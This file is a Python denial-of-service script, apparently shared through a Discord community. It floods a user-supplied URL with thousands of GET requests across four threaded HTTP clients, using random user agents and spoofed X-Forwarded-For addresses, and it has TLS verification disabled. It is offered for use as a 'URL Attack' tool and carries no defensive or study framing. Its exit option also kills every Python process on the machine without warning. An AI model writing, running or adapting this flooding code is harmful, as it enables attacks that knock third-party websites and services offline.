import os
import time
import sys
import subprocess

# --- تعريف المتغيرات والألوان في البداية ---
Almunharif1 = '\x1b[1;31m'
Almunharif2 = '\x1b[1;32m'

# --- Intro Effect ---
os.system('clear')
print("\033[91m")
end_time = time.time() + 2
while time.time() < end_time:
    print("01010101001010100101010101010101001010101010101010101")
    time.sleep(0.05)
os.system('clear')
print("\033[0m")

# --- Install & Import Dependencies ---
required_libraries = ["requests", "threading", "httpx", "aiohttp", "asyncio", "user_agent", "urllib3"]

def install_and_import(library):
    try:
        __import__(library)
    except ModuleNotFoundError:
        subprocess.check_call([sys.executable, "-m", "pip", "install", library])

for lib in required_libraries:
    install_and_import(lib)

import requests, threading, httpx, aiohttp, asyncio, urllib3
from user_agent import generate_user_agent
from random import randint

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- Attack Functions ---
def Almunharif_generate_ip(): return f"{randint(1, 255)}.{randint(1, 255)}.{randint(1, 255)}.{randint(1, 255)}"

def Almunharif_requests(target_url, Almunharif_num):
    session = requests.Session()
    for _ in range(Almunharif_num):
        headers = {'User-Agent': generate_user_agent(), 'X-Forwarded-For': Almunharif_generate_ip()}
        try:
            res = session.get(target_url, headers=headers, timeout=3, verify=False)
            print(f"{Almunharif2}Requests: {res.status_code}")
        except: pass

def Almunharif_httpx(target_url, Almunharif_num):
    with httpx.Client(verify=False) as client:
        for _ in range(Almunharif_num):
            try:
                client.get(target_url, headers={'User-Agent': generate_user_agent()}, timeout=3)
                print(f"{Almunharif2}HTTPX: Sent")
            except: pass

async def Almunharif_aiohttp(target_url, Almunharif_num):
    async with aiohttp.ClientSession() as session:
        for _ in range(Almunharif_num):
            try:
                await session.get(target_url, timeout=3)
                print(f"{Almunharif2}AIOHTTP: Sent")
            except: pass

def Almunharif_urllib3(target_url, Almunharif_num):
    http = urllib3.PoolManager(cert_reqs='CERT_NONE')
    for _ in range(Almunharif_num):
        try:
            http.request('GET', target_url, timeout=3)
            print(f"{Almunharif2}URLLIB3: Sent")
        except: pass

def run_attack():
    target = input(f"{Almunharif2}Enter Target URL: {Almunharif1}")
    threads = [
        threading.Thread(target=Almunharif_requests, args=(target, 1000)),
        threading.Thread(target=Almunharif_httpx, args=(target, 1000)),
        threading.Thread(target=Almunharif_urllib3, args=(target, 1000)),
        threading.Thread(target=lambda: asyncio.run(Almunharif_aiohttp(target, 1000)))
    ]
    for t in threads: t.start()
    for t in threads: t.join()

# --- Main Menu ---
mrx_banner = f"{Almunharif1}\n███╗   ███╗██████╗ ██╗  ██╗\n████╗ ████║██╔══██╗╚██╗██╔╝\n██╔████╔██║██████╔╝ ╚███╔╝\n██║╚██╔╝██║██╔══██╗ ██╔██╗\n██║ ╚═╝ ██║██║  ██║██╔╝ ██╗\n╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝\n\033[36mhttps://discord.gg/GJ84DXRTJ\033[0m"

while True:
    os.system('clear')
    print(mrx_banner)
    
    print("\n[1] Start URL Attack")
    print("[0] Exit and Stop Attack")
    
    choice = input("\nSelect an option: ").strip()
    
    if choice == '1':
        run_attack()
    elif choice == '0':
        print("\n[!] Stopping processes and exiting...")
        os.system('pkill -f python')
        sys.exit()
    else:
        print("\n[!] Invalid option. Please try again.")
        time.sleep(1)
